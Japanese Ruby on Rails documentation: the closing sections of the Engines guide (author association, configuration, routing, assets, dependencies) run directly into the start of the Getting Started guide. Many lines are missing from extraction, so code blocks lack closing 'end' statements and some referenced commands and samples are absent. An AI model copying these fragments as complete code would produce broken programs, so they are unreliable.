話を簡単にするため、記事のフォームのテキストフィールドは`author_name`とすることにします。記事を書くユーザーがここに自分の名前を入れられるようにします。
エンジンはこの名前を使用して`User`オブジェクトを新規作成するか、その名前が既にあるかどうかを調べます。
続いて、エンジンは作成または見つけた`User`オブジェクトを記事と関連付けます。
最初に、`author_name`テキストフィールドをエンジンのパーシャル`app/views/blorgh/articles/_form.html.erb`に追加する必要があります。
そこで、以下のコードを`title`フィールドのすぐ上に追加します。
<div class="field">
  <%= f.label :author_name %><br>
  <%= f.text_field :author_name %>
続いて、エンジンの`Blorgh::ArticleController#article_params`メソッドを更新して、新しいフォームパラメータを受け付けるようにする必要もあります。
def article_params
  params.require(:article).permit(:title, :text, :author_name)
次に、`Blorgh::Article`モデルにも`author_name`フィールドを実際の`User`オブジェクトに変換し、`User`オブジェクトを記事の`author`と関連付けてから記事を保存するコードが必要です。
このフィールド用の`attr_accessor`も設定する必要があります。これにより、このフィールド用のゲッターとセッターが定義されます。
これらをすべて行なうには、`author_name`用の`attr_accessor`と、authorとの関連付け、および`before_save`呼び出しを`app/models/blorgh/article.rb`に追加する必要があります。
`author`関連付けは、この時点ではあえて`User`クラスとハードコードしておきます。
attr_accessor :author_name
belongs_to :author, class_name: "User"
before_save :set_author
  def set_author
    self.author = User.find_or_create_by(name: author_name)
`author`オブジェクトと`User`クラスの関連付けを示すことにより、エンジンとアプリケーションの間にリンクが確立されます。
`blorgh_articles`テーブルのレコードと、`users`テーブルのレコードを関連付けるための方法が必要です。
この関連付けは`author`という名前なので、`blorgh_articles`テーブルには`author_id`というカラムが追加される必要があります。
この新しいカラムを追加するには、エンジンのディレクトリで以下のコマンドを実行する必要があります。
$ bin/rails g migration add_author_id_to_blorgh_articles author_id:integer
NOTE: 上のようにコマンドオプションでマイグレーション名とカラムの仕様を指定することで、特定のテーブルに追加しようとしているカラムがRailsによって自動的に認識され、そのためのマイグレーションが作成されます。
この他にオプションを指定する必要はありません。
このマイグレーションはアプリケーションに対して実行する必要があります。
これを行なうには、最初に以下のコマンドを実行してマイグレーションをエンジンからコピーする必要があります。
上のコマンドでコピーされるマイグレーションは _1つ_ だけである点にご注意ください。
これは、最初の2つのマイグレーションはこのコマンドが初めて実行されたときにコピー済みであるためです。
Migration with the same name already exists. 
このマイグレーションを実行するコマンドは以下のとおりです。
これですべての部品が定位置に置かれ、ある記事 (article) を、`users`テーブルのレコードで表される作者 (author) に関連付けるアクションが実行されるようになりました。この記事は`blorgh_articles`テーブルで表されます。
最後に、作者名を記事のページに表示しましょう。
`<%=`タグを使用して`@article.author`を出力すると、`to_s`メソッドがこのオブジェクトに対して呼び出されます。
この出力はデフォルトのままでは整形されていません。
これでRubyの生のオブジェクト出力が整形され、作者名が表示されるようになります。
#### アプリケーションのコントローラを使用する
Railsのコントローラでは、認証やセッション変数へのアクセスに関するコードをアプリケーション全体で共有するのが一般的です。従って、このようなコードはデフォルトで`ApplicationController`から継承します。
しかし、Railsのエンジンは基本的にメインとなるアプリケーションから独立しているので、エンジンが利用できる`ApplicationController`はスコープで制限されています。
名前空間が導入されていることでコードの衝突は回避されますが、エンジンのコントローラからメインアプリケーションの`ApplicationController`のメソッドにアクセスする必要も頻繁に発生します。
エンジンのコントローラからメインアプリケーションの`ApplicationController`へのアクセスを提供するには、エンジンが所有するスコープ付きの`ApplicationController`に変更を加え、メインアプリケーションの`ApplicationController`を継承するのが簡単な方法です。
Blorghエンジンの場合、`app/controllers/blorgh/application_controller.rb`を以下のように変更します。
end 
エンジンのコントローラはデフォルトで`Blorgh::ApplicationController`を継承します。
上の変更を行なうことで、あたかもエンジンがアプリケーションの一部であるかのように、エンジンのコントローラで`ApplicationController`にアクセスできるようになります。
この変更を行なうには、エンジンをホストするRailsアプリケーションに`ApplicationController`という名前のコントローラが存在する必要があります。
### エンジンを設定する
このセクションでは、`User`クラスをカスタマイズ可能にする方法を解説し、続いてエンジンの一般的な設定方法について解説します。
#### アプリケーションの設定を行なう
これより、アプリケーションで`User`を表すクラスをエンジンからカスタマイズ可能にする方法について説明します。
カスタマイズしたいクラスは、前述の`User`のようなクラスばかりとは限りません。
このクラスの設定をカスタマイズ可能にするには、エンジン内部に`author_class`という名前の設定が必要です。この設定は、親アプリケーション内部でユーザーを表すクラスがどれであるかを指定するためのものです。
この設定を定義するには、エンジンで使用する`Blorgh`モジュール内部に`mattr_accessor`というアクセッサを置く必要があります。
エンジンにある`lib/blorgh.rb`に以下の行を追加します。
mattr_accessor :author_class
このメソッドの動作は`attr_accessor`や`cattr_accessor`などの兄弟メソッドと似ていますが、モジュールのゲッター名とセッター名に指定された名前を使用します。
これらを使用する場合は`Blorgh.author_class`という名前で参照する必要があります。
続いて、`Blorgh::Article`モデルの設定をこの新しい設定に切り替えます。
`app/models/blorgh/article.rb`モデル内の`belongs_to`関連付けを以下のように変更します。
belongs_to :author, class_name: Blorgh.author_class
`Blorgh::Article`モデルの`set_author`メソッドは以下のクラスも使用する必要があります。
self.author = Blorgh.author_class.constantize.find_or_create_by(name: author_name)
`author_class`で保存時に`constantize`が必ず呼び出されるようにしたい場合は、`lib/blorgh.rb`の`Blorgh`モジュール内部の`author_class`ゲッターメソッドをオーバーライドするだけでできます。これにより、値の保存時に必ず`constantize`を呼び出してから結果が返されます。
def self.author_class
  @@author_class.constantize
これにより、`set_author`用の上のコードは以下のようになります。
self.author = Blorgh.author_class.find_or_create_by(name: author_name)
これにより、記述がやや短くなり、動作がやや明示的でなくなります。
この`author_class`メソッドは常に`Class`オブジェクトを返す必要があります。
`author_class`メソッドが`String`ではなく`Class`を返すように変更したので、`Blorgh::Article`の`belongs_to`定義もそれに合わせて変更する必要があります。
belongs_to :author, class_name: Blorgh.author_class.to_s
この設定をアプリケーション内で行なうには、イニシャライザを使用する必要があります。
イニシャライザを使用することで、アプリケーションの設定はアプリケーションが起動してエンジンのモデルを呼び出すまでに完了します。この動作は既存のこの設定に依存する場合があります。
`blorgh`がインストールされているアプリケーションの`config/initializers/blorgh.rb`にイニシャライザを作成して、以下の記述を追加します。
WARNING: このクラス名は必ず`String`で (=引用符で囲んで) 表してください。クラス自身を使用しないでください。
クラス自身が使用されていると、Railsはそのクラスを読み込んで関連するテーブルを参照しようとします。
このとき参照先のテーブルが存在しないと問題が発生する可能性があります。
このため、クラス名は`String`で表し、後にエンジンが`constantize`でクラスに変換する必要があります。
続いて、新しい記事を1つ作成してみることにしましょう。
記事の作成はこれまでとまったく同様に行えます。1つだけ異なるのは、今回はクラスの動作を学ぶために`config/initializers/blorgh.rb`の設定をエンジンで使用する点です。
使用するクラスがそのためのAPIさえ備えていれば、使用するクラスに厳密に依存することはありません。
エンジンで使用するクラスで必須となるメソッドは`find_or_create_by`のみです。このメソッドはそのクラスのオブジェクトを1つ返します。
もちろん、このオブジェクトは何らかの形で参照可能な識別子 (id) を持つ必要があります。
#### 一般的なエンジンの設定
エンジンを使ううちに、その中でイニシャライザや国際化などの機能オプションを使用したくなることでしょう。
うれしいことに、RailsエンジンはRailsアプリケーションと大半の機能を共有しているので、これらは完全に実現可能です。
実際、Railsアプリケーションが持つ機能はエンジンが持つ機能のスーパーセットなのです。
たとえばイニシャライザ (エンジンが読み込まれる前に実行されるコード) を使用したいのであれば、そのための場所である`config/initializers`フォルダに置きます。
このディレクトリの機能については『Railsアプリケーションを設定する』ガイドの[イニシャライザファイルを使用する](configuring.html#イニシャライザ)を参照してください。エンジンのイニシャライザは、アプリケーションの`config/initializers`ディレクトリに置かれているイニシャライザとまったく同様に動作します。
標準のイニシャライザを使用したい場合も同様です。
ロケールファイルも、アプリケーションの場合と同様`config/locales`ディレクトリに置けばよいようになっています。
エンジンをテストする
エンジンが生成されると、`test/dummy`ディレクトリの下に小規模なダミーアプリケーションが自動的に配置されます。
このダミーアプリケーションはエンジンのマウント場所として使用されるので、エンジンのテストがきわめてシンプルになります。
このディレクトリ内でコントローラやモデル、ビューを生成してアプリケーションを拡張し、続いてこれらを使用してエンジンをテストできます。
`test`ディレクトリは、通常のRailsにおけるtesting環境と同様に扱う必要があります。Railsのtesting環境では単体テスト、機能テスト、結合テストを行なうことができます。
### 機能テスト
特に機能テストを作成する際には、テストが実行されるのはエンジンではなく`test/dummy`に置かれるダミーアプリケーション上であるという点に留意する必要があります。
このようになっているのは、testing環境がそのように設定されているためです。エンジンの主要な機能、特にコントローラをテストするには、エンジンをホストするアプリケーションが必要です。
コントローラの機能は、通常であればたとえば以下のように`GET`をコントローラに送信することでテストするでしょう。
get :index
    ...
しかしこれは正常に機能しないでしょう。
アプリケーションは、このようなリクエストをエンジンにルーティングする方法を知らないので、明示的にエンジンにルーティングする必要があります。
setup do
  @routes = Engine.routes
上のようにすることで、このコントローラの`index`アクションに対して`GET`リクエストを送信しようとしていることがアプリケーションによって認識され、かつそのためにアプリケーションのルーティングではなくエンジンのルーティングが使用されるようになります。
エンジンの機能を改良する
このセクションでは、エンジンのMVC機能をメインのRailsアプリケーションに追加またはオーバーライドする方法について解説します。
### モデルとコントローラをオーバーライドする
エンジンのモデルクラスとコントローラクラスは、オープンクラスとしてメインのRailsアプリケーションで拡張可能です。Railsのモデルクラスとコントローラクラスは、Rails特有の機能を継承しているほかは通常のRubyクラスと変わりありません。
エンジンのクラスをオープンクラス化 (open classing) することで、メインのアプリケーションで使用できるように再定義されます。
これは、デザインパターンで言うdecoratorパターンとして実装するのが普通です。
クラスの変更内容が単純であれば、`Class#class_eval`を使用します。
クラスの変更が複雑な場合は、`ActiveSupport::Concern`の使用をご検討ください。
#### デコレータとコードの読み込みに関するメモ
Railsアプリケーション自身はこれらのデコレータを参照することはないので、Railsの自動読み込み機能ではこれらのデコレータを読み込んだり起動したりできません。
つまり、デコレータは手動でrequireする必要があるということです。
これを行なうためのサンプルコードをいくつか掲載します。
# lib/blorgh/engine.rb
    config.to_prepare do
      Dir.glob(Rails.root + "app/decorators/**/*_decorator*.rb").each do |c|
        require_dependency(c)
上のコードは、デコレータだけではなく、メインのアプリケーションから参照されないすべてのエンジンのコードを読み込みます。
#### Class#class_evalを使用してdecoratorパターンを実装する
`Article#time_since_created`を**追加する**場合:
# MyApp/app/decorators/models/blorgh/article_decorator.rb
Blorgh::Article.class_eval do
  def time_since_created
    Time.current - created_at
# Blorgh/app/models/article.rb
`Article#summary`を**オーバーライド**する場合:
  def summary
    "#{title} - #{truncate(text)}"
    "#{title}"
#### ActiveSupport::Concernを使用してdecoratorパターンを実装する
ActiveSupport::Concernは、相互にリンクしている依存モジュールおよび依存クラスの実行時読み込み順序を管理し、コードのモジュール化を高めます。
`Article#time_since_created`を**追加**して`Article#summary`を**オーバーライド**する場合:
# MyApp/app/models/blorgh/article.rb
class Blorgh::Article < ActiveRecord::Base
  include Blorgh::Concerns::Models::Article
# Blorgh/lib/concerns/models/article
module Blorgh::Concerns::Models::Article
  extend ActiveSupport::Concern
  # 'included do'は、インクルードされたコードを
  # それがインクルードされている (article.rb) コンテキストで評価する
  # そのモジュールのコンテキストで実行されている (blorgh/concerns/models/article) は評価しない
  included do
    attr_accessor :author_name
    belongs_to :author, class_name: "User"
    before_save :set_author
    private
      def set_author
        self.author = User.find_or_create_by(name: author_name)
  module ClassMethods
    def some_class_method
      'some class method string'
### ビューをオーバーライドする
Railsは出力すべきビューを探索する際に、アプリケーションの`app/views`ディレクトリを最初に探索します。
探しているビューがそこにない場合、続いてそのディレクトリを持つすべてのエンジンの`app/views`ディレクトリを探索します。
たとえば、アプリケーションが`Blorgh::ArticlesController`のindexアクションの結果を出力するためのビューを探索する際には、最初にアプリケーション自身の`app/views/blorgh/articles/index.html.erb`を探索します。
そこに見つからない場合は、続いてエンジンの中を探索します。
`app/views/blorgh/articles/index.html.erb`というファイルを作成することで、上の動作を上書きすることができます。
こうすることで、通常のビューでの出力結果を完全に変えることができます。
`app/views/blorgh/articles/index.html.erb`というファイルを作成して以下のコードを追加するとします。
<h1>Articles</h1>
<%= link_to "New Article", new_article_path %>
<% @articles.each do |article| %>
  <h2><%= article.title %></h2>
  <small>By <%= article.author %></small>
  <%= simple_format(article.text) %>
  <hr>
### ルーティング
デフォルトでは、エンジン内部のルーティングはアプリケーションのルーティングから分離されています。
これは、`Engine`クラス内の`isolate_namespace`呼び出しによって実現されます。
これは本質的に、アプリケーションとエンジンが完全に同一の名前のルーティングを持つことができ、しかも衝突しないということを意味します。
エンジン内部のルーティングは、以下のように`config/routes.rb`の`Engine`クラスによって構成されます。
エンジンとアプリケーションのルーティングがこのように分離されているので、アプリケーションの特定の部分をエンジンの特定の部分にリンクしたい場合は、エンジンのルーティングプロキシメソッドを使用する必要があります。
`articles_path`のような通常のルーティングメソッドの呼び出しは、アプリケーションとエンジンの両方でそのようなヘルパーが定義されている場合には期待と異なる場所にリンクされる可能性があります。
たとえば以下のコード例では、そのテンプレートがアプリケーションでレンダリングされる場合の行き先はアプリケーションの`articles_path`になり、エンジンでレンダリングされる場合の行き先はエンジンの`articles_path`になります。
<%= link_to "Blog articles", articles_path %>
このルーティングを常にエンジンの`articles_path`ルーティングヘルパーメソッドで取り扱うようにしたい場合、以下のようにエンジンと同じ名前を共有するルーティングプロキシメソッドを呼び出す必要があります。
<%= link_to "Blog articles", blorgh.articles_path %>
逆にエンジン内部からアプリケーションを参照する場合は、同じ要領で`main_app`を使用します。
<%= link_to "Home", main_app.root_path %>
上のコードをエンジン内で使用すると、行き先は**常に**アプリケーションのルートになります。
この`main_app`ルーティングプロキシメソッドを呼び出しを省略すると、行き先は呼び出された場所によってアプリケーションまたはエンジンのいずれかとなって確定しません。
ルーティングプロキシメソッド呼び出しを省略したこのようなアプリケーションルーティングヘルパーメソッドを、エンジン内でレンダリングされるテンプレートから呼び出そうとすると、未定義メソッド呼び出しエラーが発生することがあります。
このような問題が発生した場合は、アプリケーションのルーティングメソッドを、`main_app`というプレフィックスを付けずにエンジンから呼びだそうとしていないかどうかを確認してください。
### アセット
エンジンのアセットは、通常のアプリケーションで使用されるアセットとまったく同じように機能します。
エンジン内の他のコンポーネントと同様、アセットも名前空間化される必要があります。
たとえば、`style.css`というアセットは、`app/assets/stylesheets/style.css`ではなく`app/assets/stylesheets/[エンジン名]/style.css`に置かれる必要があります。
アセットが名前空間化されないと、ホストアプリケーションに同じ名前のアセットが存在する場合にアプリケーションのアセットが使用されてエンジンのアセットが使用されないということが発生する可能性があります。
`app/assets/stylesheets/blorgh/style.css`というアセットを例にとって説明します。このアセットをアプリケーションに含めるには、`stylesheet_link_tag`を使用してアセットがあたかもエンジン内部にあるかのように参照します。
<%= stylesheet_link_tag "blorgh/style.css" %>
処理されるファイルでアセットパイプラインのrequireステートメントを使用して、これらのアセットが他のアセットに依存することを指定することもできます。
INFO: SassやCoffeeScriptなどの言語を使用する場合は、必要なライブラリを`.gemspec`に追加する必要があります。
### アセットとプリコンパイルを分離する
エンジンが持つアセットは、ホスト側のアプリケーションでは必ずしも必要ではないことがあります。
たとえば、エンジンでしか使用しない管理機能を作成したとしましょう。
この場合、ホストアプリケーションでは`admin.css`や`admin.js`は不要です。
これらのアセットを必要とするのは、gemのadminレイアウトしかないからです。
ホストアプリケーションから見れば、自分が持つスタイルシートに`"blorgh/admin.css"`を追加する意味はありません。
このような場合、これらのアセットを明示的にプリコンパイルする必要があります。
それにより、`rake assets:precompile`が実行されたときにエンジンのアセットを追加するようsprocketsに指示されます。
プリコンパイルの対象となるアセットは`engine.rb`で定義できます。
initializer "blorgh.assets.precompile" do |app|
  app.config.assets.precompile += %w(admin.css admin.js)
詳細については、[アセットパイプライン](asset_pipeline.html)ガイドを参照してください。
### 他のgemとの依存関係
エンジンが依存するgemについては、エンジンのルートディレクトリの`.gemspec`に記述する必要があります。
エンジンはgemとしてインストールされるので、このようにする必要があります。
依存関係を`Gemfile`に指定したのでは伝統的なgemインストールで依存関係が認識されないので、必要なgemが自動的にインストールされず、エンジンが正常に機能しなくなります。
伝統的な`gem install`コマンド実行時に同時にインストールされる必要のあるgemを指定するには、以下のようにエンジンの`.gemspec`ファイルにある`Gem::Specification`ブロックの内側に記述します。
s.add_dependency "moo"
アプリケーションの開発時にのみ必要となるgemのインストールを指定するには、以下のように記述します。
s.add_development_dependency "moo"
どちらの依存gemも、アプリケーションで`bundle install`を実行するときにインストールされます。
開発時にのみ必要となるgemは、エンジンのテスト実行中にのみ使用されます。
エンジンがrequireされるときに依存gemもすぐにrequireしたい場合は、以下のようエンジンが初期化されるより前にrequireする必要があることにご注意ください。
たとえば次のようになります。
require 'other_engine/engine'
require 'yet_another_engine/engine'
module MyEngine
Railsをはじめよう<n>=============
このガイドでは、Ruby on Rails (以下 Rails) を初めて設定して実行するまでを解説します。
* Railsのインストール方法、新しいRailsアプリケーションの作成方法、アプリケーションからデータベースへの接続方法
* Railsアプリケーションの一般的なレイアウト
* MVC (モデル・ビュー・コントローラ) およびRESTfulデザインの基礎
* Railsアプリケーションの原型を素早く立ち上げる方法
本ガイドの前提条件
本ガイドは、ゼロからRailsアプリケーションを構築したいと考えている初心者を対象にしています。
読者がRailsの経験がないことを前提としています。
ただし、このドキュメントを最大限に活用するために、以下のソフトウェアがインストールされ、利用可能な状態になっていることを前提としています。
RubyGemsの詳細については、[RubyGemsガイド](http://rubygems-guides-jp.herokuapp.com/)を参照してください。
Railsとは、Rubyプログラミング言語の上で動作するWebアプリケーションフレームワークです。
Rubyの経験がまったくない場合、Railsを学ぶのはかなり大変な作業になるでしょう。
Rubyを学ぶための精選されたオンラインリソース一覧はたくさんありますので、その中から以下をご紹介します。
* [Rubyプログラミング言語公式Webサイトの情報](https://www.ruby-lang.org/ja/documentation/)
* [reSRCが選ぶ無料のプログラミング学習用書籍一覧 (英語)](http://resrc.io/list/10/list-of-free-programming-books/#ruby)
これらはいずれもよくできていますが、中にはRubyのバージョンが1.6など古いものもありますのでご注意ください。また、バージョン1.8を対象にしているものが多く、Railsでの日常的な開発に使用されている新しい文法が含まれていないこともあります。
Railsとは何か
Railsとは、Rubyプログラミング言語で書かれたWebアプリケーションフレームワークです。
Railsは、あらゆる開発者がWebアプリケーションの開発を始めるうえで必要となる作業やリソースを事前に仮定して準備しておくことで、Webアプリケーションをより簡単にプログラミングできるように設計されています。
他の多くの言語によるWebアプリケーションフレームワークと比較して、アプリケーションを作成する際のコード量がより少なくて済むにもかかわらず、より多くの機能を実現できます。
Rails経験の長い多くの開発者から、おかげでWebアプリケーションの開発がとても楽しくなったという意見をいただいています。
Railsは、最善の開発方法というものを1つに定めるという、ある意味大胆な判断に基いて設計されています。
Railsは、何かをなすうえで最善の方法というものが1つだけあると仮定し、それに沿った開発を全面的に支援します。言い換えれば、ここで仮定されている理想の開発手法に沿わない別の開発手法は行いにくくなるようにしています。
この「The Rails Way」、「Rails流」とでもいうべき手法を学んだ人は、開発の生産性が著しく向上することに気付くでしょう。
従って、Rails開発において別の言語環境での従来の開発手法に固執し、他所で学んだパターンを強引に適用しようとすると、せっかくの開発が楽しくなくなってしまうでしょう。
Railsの哲学には、以下の2つの主要な基本理念があります。
* **同じことを繰り返すな (Don't Repeat Yourself: DRY):** DRYはソフトウェア開発上の原則であり、「システムを構成する知識のあらゆる部品は、常に単一であり、明確であり、信頼できる形で表現されていなければならない」というものです。
同じコードを繰り返し書くことを徹底的に避けることで、コードが保守しやすくなり、容易に拡張できるようになり、そして何よりバグを減らすことができます。
* **設定より規約が優先される (Convention Over Configuration):** Railsでは、Webアプリケーションで行われるさまざまなことを実現するための最善の方法を明確に思い描いており、Webアプリケーションの各種設定についても従来の経験や慣習を元に、それらのデフォルト値を定めています。このようにある種独断でデフォルト値が決まっているおかげで、開発者の意見をすべて取り入れようとした自由過ぎるWebアプリケーションのように、開発者が延々と設定ファイルを設定して回らずに済みます。
Railsプロジェクトを新規作成する
本ガイドを活用するための最善の方法は、以下の手順を文字どおり1つずつ実行し、手順を取りこぼさないようにすることです。取りこぼしがあると、その後の手順が期待どおりに進まない可能性があります。
本ガイドの手順に従うことで、`blog`という名前の非常にシンプルなブログのRailsプロジェクトを作成できます。
Railsアプリケーションを構築する前に、Rails本体がインストールされていることを確認してください。
TIP: 以下の例では、Unix系OSのプロンプトとして`$`記号を使用していますが、これはカスタマイズ可能であり、自分の環境では異なる記号になっていることもあります。
Windowsでは`c:\source_code>`のように表示されます。
### Railsのインストール
ターミナル (コマンドプロンプトとも言います) ウィンドウを開いてください。
Mac OS Xの場合、ターミナル (Terminal.app) という名前のアプリケーションを実行します。Windowsの場合は[スタート] メニューから [ファイル名を指定して実行] をクリックして'cmd.exe'と入力します。
`$`で始まる記述はコマンド行なので、これらはコマンドラインに入力して実行してください。
続いて現在インストールされているRubyのバージョンが最新のものであることを確認してください。
$ ruby -v
ruby 2.0.0p353
自分のPC環境にRubyがインストールされていない場合は、[ruby-lang.org](https://www.ruby-lang.org/ja/installation/) を参照して、自分の環境に合うインストール方法を参照してください。
多くのUnix系OSには実用的なバージョンのSQLite3が同梱されています。 
正しくインストールされていること、PATH環境変数が正しく通っていることを確認してください。
$ sqlite3 --version
上を実行することでバージョンを確認できます。
Railsをインストールするには、`gem install`コマンドを実行します。このコマンドはRubyGemsによって提供されます。
$ gem install rails
以下のコマンドを実行することで、すべて正常にインストールできたかどうかを確認できます。
$ rails --version
### ブログアプリケーションを作成する
Railsには、ジェネレータという多数のスクリプトが付属しており、これらが特定のタスクを開始するために必要なものを自動的に作り出してくれるので、開発が容易になります。
その中から、新規アプリケーション作成用のジェネレータを使ってみましょう。これを実行すればRailsアプリケーションの基本的な部分が提供されるので、開発者が自分でこれらを作成する必要はありません。
ジェネレータを実行するには、ターミナルを開き、Railsファイルを作成したいディレクトリに移動して、以下を入力します。
$ rails new blog
これにより、Blogという名前のRails アプリケーションが`blog`ディレクトリに作成され、`Gemfile`というファイルで指定されているgemファイルが`bundle install`コマンドによってインストールされます。
TIP: `rails new -h`を実行すると、Railsアプリケーションビルダで使用できるすべてのコマンドラインオプションを確認できます。
ブログアプリケーションを作成したら、そのフォルダ内に移動します。
$ cd blog
`blog`ディレクトリの下には多数のファイルやフォルダが生成されており、これらがRailsアプリケーションを構成しています。
このチュートリアルではほとんどの作業を`app`ディレクトリで行いますが、Railsが生成したファイルとフォルダについてここで簡単に説明しておきます。
| ファイル/フォルダ | 目的 |
|app/|ここにはアプリケーションのコントローラ、モデル、ビュー、ヘルパー、メイラー、そしてアセットが置かれます。
以後、本ガイドでは基本的にこのディレクトリを中心に説明を行います。
|config/|アプリケーションの設定ファイル (ルーティング、データベースなど) がここに置かれます。
詳細については[Railsアプリケーションを設定する](configuring.html) を参照してください。
|config.ru|アプリケーションの起動に必要となる、Rackベースのサーバー用のRack設定ファイルです。
|db/|現時点のデータベーススキーマと、データベースマイグレーションファイルが置かれます。
|Gemfile<br>Gemfile.lock|これらのファイルは、Railsアプリケーションで必要となるgemの依存関係を記述します。
この2つのファイルはBundler gemで使用されます。
|lib/|アプリケーションで使用する拡張モジュールが置かれます。
|log/|アプリケーションのログファイルが置かれます。
|public/|このフォルダの下にあるファイルは外部 (インターネット) からそのまま参照できます。
静的なファイルやコンパイル済みアセットはここに置きます。
|Rakefile|このファイルには、コマンドラインから実行できるタスクを記述します。
ここでのタスク定義は、Rails全体のコンポーネントに対して定義されます。
独自のRakeタスクを定義したい場合は、Rakefileに直接書くと権限が強すぎるので、なるべくlib/tasksフォルダの下にRake用のファイルを追加するようにしてください。
|README.rdoc|アプリケーションの概要を説明するマニュアルをここに記入します。
このファイルにはアプリケーションの設定方法などを記入し、これさえ読めば誰でもアプリケーションを構築できるようにしておく必要があります。
|test/|Unitテスト、フィクスチャなどのテスト関連ファイルをここに置きます。
テストについては[Railsアプリケーションをテストする](testing.html)を参照してください。
|tmp/|キャッシュ、pid、セッションファイルなどの一時ファイルが置かれます。
|vendor/|サードパーティによって書かれたコードはすべてここに置きます。
通常のRailsアプリケーションの場合、外部からのgemファイルをここに置きます。
Hello, Rails!
手始めに、画面に何かテキストを表示してみましょう。
そのためには、Railsアプリケーションサーバーを起動しなくてはなりません。
### Webサーバーを起動する
先ほど作成したRailsアプリケーションは、既に実行可能な状態になっています。
Webアプリケーションを開発用のPCで実際に動かしてこのことを確かめてみましょう。
`blog`ディレクトリに移動し、以下のコマンドを実行します。
Mac OS XやWindowsにはJavaScriptランタイムが同梱されています。
Railsが新規アプリケーション用に生成する`Gemfile`には`therubyracer`というgemがコメントアウトされた状態で含まれており、必要であればこのgemのコメントアウトを解除して有効にすることもできます。
`therubyrhino`はJRubyユーザー向けに推奨されているランタイムであり、JRuby環境下ではデフォルトでアプリケーションの`Gemfile`に追加されます。
Railsで起動されるWebサーバーは、Rubyにデフォルトで付属しているWEBrickです。
Webアプリケーションが実際に動作しているところを確認するには、ブラウザを開いて <http://localhost:3000> を表示してください。
以下のようなRailsのデフォルト情報ページが表示されます。
Welcome画面のスクリーンショット](images/getting_started/rails_welcome.png)
TIP: Webサーバーを停止するには、実行されているターミナルのウィンドウでCtrl + Cキーを押します。
コマンドプロンプトのカーソルがふたたび表示されれば、サーバーは停止しています。
Mac OS Xを含む多くのUnix系OSではプロンプトとしてドル記号`$`が使用されます。
一般に、Railsの開発モードではファイルに変更を加えた場合でもサーバーを再起動する必要はありません。ファイルの変更は自動的にサーバーに反映されます(訳注: libファイルやapplication.rbなど一部の設定ファイルなどはサーバーを再起動しないと読み込まれません)。
Railsの初期画面である「Welcome aboard」ページは、新しいRailsアプリケーションの _スモークテスト_ として使えます。このページが表示されれば、サーバーが正常に動作していることまでは確認できたことになります。
 _About your application's environment_ リンクをクリックすれば、アプリケーション環境の概要を確認できます。
### Railsに"Hello"と挨拶させる
Railsに"Hello"と表示するには、最低でも _コントローラ_ と _ビュー_ が必要です。
コントローラは、アプリケーションに対する特定のリクエストを受け取って処理するのが役割です。
_ルーティング_ は、リクエストをどのコントローラに割り振るかを決定するためのものです。
1つのコントローラに対して複数のルーティングがあるのはよくあることです。そしてコントローラにはいくつかの _アクション_ があります。いくつかの異なるルーティングに対して、それぞれ異なるアクションを割り当てることができます。
それぞれのアクションは、情報を集めてビューに送り出すのが役割です。
ビューの役割は、この情報をユーザーが読める形式で表示することです。
ここで気を付けていただきたい重要な違いは、表示する情報を集めるのは _コントローラ_ であって、ビューではないということです。
ビューは、コントローラが作成した情報に対して余計なことをせずに表示する必要があります。
ビューテンプレートで使用できる言語は、デフォルトではeRuby (ERBとも、Embedded Rubyとも呼ばれます) が使用されます (訳注: 近年はhamlテンプレートがよく使われます)。ERBで書かれたコードは、ユーザーに表示される前のリクエストサイクルでRailsによって処理されます。
コントローラを新規作成するには、コントローラ用のジェネレータを実行します。ここでは以下のように、welcomeという名前のコントローラの中にindexというアクションを作成するよう指定します。
Railsは指定どおりコントローラを作成し、関連ファイルやルーティングも設定してくれます。
create  app/controllers/welcome_controller.rb
  get 'welcome/index'
create    app/views/welcome
create    app/views/welcome/index.html.erb
create    test/controllers/welcome_controller_test.rb
create    app/helpers/welcome_helper.rb
invoke    coffee
create      app/assets/javascripts/welcome.js.coffee
invoke    scss
create      app/assets/stylesheets/welcome.css.scss
この中でもっとも重要なのはもちろんコントローラです。welcomeコントローラは`app/controllers/welcome_controller.rb`に作成され、対応するindexビューが`app/views/welcome/index.html.erb`に作成されます。
テキストエディタで`app/views/welcome/index.html.erb`を開いてみましょう。
ファイルの中身をすべて削除し、以下の1行に置き換えてください。
<h1>Hello, Rails!
### アプリケーションのホームページを設定する
以上でコントローラとビューが作成されました。Railsに"Hello, Rails!"と表示させてみましょう。
ここでは、サイトのルートURL <http://localhost:3000> にアクセスしたときにこのメッセージが表示されるようにします。
現時点のルートURLでは、デフォルトの"Welcome aboard"が表示されていますので、これを変更します。
Railsで表示させたい実際のホームページの場所を指定します。
エディタで`config/routes.rb`を開いてください。
  # The priority is based upon order of creation:
  # first created -> highest priority.
<n>  #<n>
  # You can have the root of your site routed with "root"
  # root 'welcome#index'
上はアプリケーションの _ルーティングファイル_ の内容です。外部からのリクエストをどのようにコントローラとアクションに振り分けるかを、DSL (ドメイン特化言語: domain-specific language) という特殊な言語を使用してこのファイル内に記述します。
デフォルトのconfig/routes.rbには多数のルーティングサンプルがコメント行に記載されており、そのうちの1つに、サイトのルートにアクセスがあったときに接続するコントローラとアクションを指定する方法が書かれています。
`root`で始まっている行を見つけ、コメント記号を外してください。
以下のようになるはずです。
root 'welcome#index'
`root 'welcome#index'`と記述することで、アプリケーションのルートURLへのアクセスをwelcomeコントローラのindexアクションに割り当てるようRailsに指示が伝わります。同様に、`get 'welcome/index'`は<http://localhost:3000/welcome/index>というリクエストをwelcomeコントローラのindexアクションに割り当てます。
`app/views/welcome/index.html.erb`の中に書いた"Hello, Rails!"という文字がブラウザ上に表示されるはずです。`WelcomeController`の`index`アクションへのルーティングが新たに形成され、ビューが正しく表示されたことがこれで確認できました。
TIP: ルーティングの詳細については[Railsのルーティング](routing.html)を参照してください。
アプリケーションの実装と実行
以上で、コントローラとアクションとビューの作成方法を説明いたしました。ここからはもう少しブログらしい体裁を整えていきましょう。
今度はBlogアプリケーションに新しく _リソース_ を作成します。
ここで言う「リソース」とは、記事、人、動物などのよく似たオブジェクト同士が集まったものを指します。
リソースに対して作成 (create)、読み出し (read)、更新 (update)、削除 (destroy) の4つの操作を行なうことができるようになっており、これらの操作の頭文字を取って _CRUD_ と呼ばれます。
Railsのルーティングには`resources`メソッドがあり、これを使用してRESTリソースへの標準的なルーティングを宣言できます (訳注: RESTについては[Wikipedia](http://ja.wikipedia.org/wiki/REST)を参照してください)。
  root 'welcome#index'
